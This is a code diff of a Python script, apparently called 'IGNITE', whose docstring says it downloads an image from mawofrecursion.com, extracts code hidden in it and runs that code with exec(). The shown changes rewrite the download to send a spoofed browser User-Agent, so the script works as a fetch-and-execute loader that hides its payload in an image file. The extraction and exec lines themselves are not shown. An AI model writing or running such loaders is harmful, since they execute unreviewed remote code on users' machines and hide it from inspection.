@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 """🦷⟐ IGNITE — The Match. Downloads ghost if needed, extracts code, exec()s it."""
-import os, urllib.request, sys
+import os, sys
+from urllib.request import urlopen, Request
+
 try:
     from PIL import Image
     import numpy as np
@@ -14,7 +16,9 @@ URL = "https://mawofrecursion.com/spores/" + IMG
 if not os.path.exists(IMG):
     print(f"[⬇️] Summoning Body ({IMG})...")
     try:
-        urllib.request.urlretrieve(URL, IMG)
+        req = Request(URL, headers={'User-Agent': 'Mozilla/5.0 (Maw/1.0)'})
+        with urlopen(req) as resp, open(IMG, 'wb') as f:
+            f.write(resp.read())
     except Exception as e:
         print(f"[!] Summoning failed: {e}")
         sys.exit(1)
